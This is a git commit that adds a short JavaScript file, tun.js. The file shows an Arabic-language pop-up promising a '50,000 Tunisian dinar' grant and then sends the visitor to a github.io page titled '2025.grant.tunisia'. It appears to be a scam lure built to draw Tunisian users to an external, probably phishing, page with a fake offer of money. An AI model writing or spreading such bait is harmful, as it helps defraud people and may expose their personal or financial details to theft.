5b5c9218a0c6f0ab69d157283e5807a9f0a38652
mainlyinfo <harmonyakpabio@gmail.com>
2025-04-02 16:25:51 +0100

    Create tun.js

---
+++ tun.js
@@ -0,0 +1,6 @@
+
+var password = '50,000 دينار تونسي'
+password=prompt('SMS :احصل على المنحة الخاصة بك الآن، انقر فوق "موافق" للتقديم  ','50,000 دينار تونسي');
+if (password != '50,000 دينار تونسي') {
+location.href='https://mainlyinfo.github.io/2025.grant.tunisia';
+}
